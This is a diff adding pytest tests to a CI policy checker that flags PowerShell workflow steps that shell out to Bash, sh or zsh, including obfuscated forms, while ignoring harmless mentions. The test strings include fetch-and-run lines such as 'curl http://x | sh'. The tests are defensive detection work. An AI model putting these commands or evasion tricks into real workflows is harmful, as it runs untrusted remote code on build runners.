@@ -7198,3 +7198,121 @@ def test_staged_file_promotion_needs_both_a_write_and_an_execution() -> None:
     unstaged = "echo 'c${{ inputs.x }}url http://y' > /tmp/f & sh /tmp/other"
     assert policy._splices_expression_into_command_word(staged) is True
     assert policy._splices_expression_into_command_word(unstaged) is False
+
+
+_POWERSHELL_SHELL_OUTS = (
+    'bash -c "curl http://x | sh"',
+    "& bash -c $payload",
+    ". /usr/bin/sh",
+    'Start-Process bash -ArgumentList "-c","curl x|sh"',
+    'Start-Process -FilePath sh -ArgumentList "-c","x"',
+    '$p = "curl x | sh"\nbash -c $p',
+    'Write-Host hi; sh -c "curl x | sh"',
+    "echo hi | bash",
+    '/bin/dash -c "x"',
+    'zsh -c "curl x | sh"',
+    'bash.exe -c "x"',
+    '& "bash" -c $p',
+    "if ($true) { bash -c $p }",
+    "& 'bash' -c $p",
+    "ba`sh -c $p",
+)
+
+
+@pytest.mark.parametrize("body", _POWERSHELL_SHELL_OUTS)
+def test_powershell_shell_outs_are_detected(body: str) -> None:
+    """Every way a PowerShell step reaches a POSIX shell is reported.
+
+    Semgrep sub-parses a ``run:`` body as Bash only for a Bash step, so each of
+    these produces zero findings and zero errors while the payload still runs
+    under Bash on the runner. Refs #3684.
+    """
+    assert policy._posix_shell_invocations(body) != []
+
+
+_POWERSHELL_DATA_MENTIONS = (
+    'Write-Host "Use bash for this"',
+    '$msg = "install with: curl x | sh"',
+    'Get-ChildItem | Where-Object { $_.Name -eq "bash" }',
+    "# bash is not available here",
+    '<#\n bash -c "curl | sh"\n#>\nWrite-Host ok',
+    '$shells = @("bash", "sh", "zsh")',
+    'if ($env:SHELL -match "bash") { Write-Host yes }',
+    'Write-Output "sh"',
+    'Set-Content -Path out.txt -Value "bash -c hi"',
+    '$x = "bash"',
+    "# call and the bash echo, the output is empty",
+    'Write-Host "run bash later"',
+)
+
+
+@pytest.mark.parametrize("body", _POWERSHELL_DATA_MENTIONS)
+def test_powershell_data_mentions_are_not_invocations(body: str) -> None:
+    """Naming a shell in a string, a comment, or a comparison is not running it."""
+    assert policy._posix_shell_invocations(body) == []
+
+
+def test_naive_shell_name_regex_negative_control() -> None:
+    """Prove the quote-aware scan is what avoids the false positives.
+
+    A plain word-boundary search for a shell name flags real workflow prose. One
+    step in this repository says "the bash echo" in a comment, so the naive form
+    would block a push over an English sentence.
+    """
+    naive = re.compile(r"\b(?:bash|sh|dash|zsh|ksh)\b")
+    flagged = [body for body in _POWERSHELL_DATA_MENTIONS if naive.search(body)]
+    assert len(flagged) > len(_POWERSHELL_DATA_MENTIONS) // 2
+    assert all(policy._posix_shell_invocations(body) == [] for body in flagged)
+
+
+def test_powershell_scan_reports_only_powershell_steps(tmp_path: Path) -> None:
+    """The scan reads PowerShell steps and leaves Bash steps to Semgrep."""
+    workflow = tmp_path / ".github" / "workflows" / "w.yml"
+    workflow.parent.mkdir(parents=True)
+    workflow.write_text(
+        "on: push\n"
+        "jobs:\n"
+        "  j:\n"
+        "    steps:\n"
+        "      - shell: bash\n"
+        '        run: bash -c "curl http://x | sh"\n'
+        "      - shell: pwsh\n"
+        '        run: Write-Host "bash is only mentioned"\n',
+        encoding="utf-8",
+    )
+    assert policy._scan_powershell_shell_outs(tmp_path, [".github/workflows/w.yml"]) == 0
+    workflow.write_text(
+        "on: push\n"
+        "jobs:\n"
+        "  j:\n"
+        "    steps:\n"
+        "      - shell: pwsh\n"
+        '        run: bash -c "curl http://x | sh"\n',
+        encoding="utf-8",
+    )
+    assert policy._scan_powershell_shell_outs(tmp_path, [".github/workflows/w.yml"]) == 1
+
+
+def test_powershell_scan_skips_unreadable_and_non_yaml_paths(tmp_path: Path) -> None:
+    """A missing file or a non-YAML path is skipped rather than raising."""
+    assert policy._scan_powershell_shell_outs(tmp_path, ["scripts/a.py"]) == 0
+    assert policy._scan_powershell_shell_outs(tmp_path, ["absent.yml"]) == 0
+
+
+@pytest.mark.parametrize(
+    ("shell", "expected"),
+    [
+        ("pwsh", True),
+        ("powershell", True),
+        ("pwsh -NoProfile", True),
+        ("C:/tools/pwsh.exe -NoLogo", True),
+        ('"C:\\Program Files\\PowerShell\\pwsh.exe" -NoProfile', True),
+        ("bash -c 'pwsh'", False),
+        ("bash", False),
+        ("", False),
+        (None, False),
+    ],
+)
+def test_powershell_shell_declaration_is_recognised(shell: str | None, expected: bool) -> None:
+    """The shell key is matched by executable name, not by exact string."""
+    assert policy._is_powershell_shell(shell) is expected
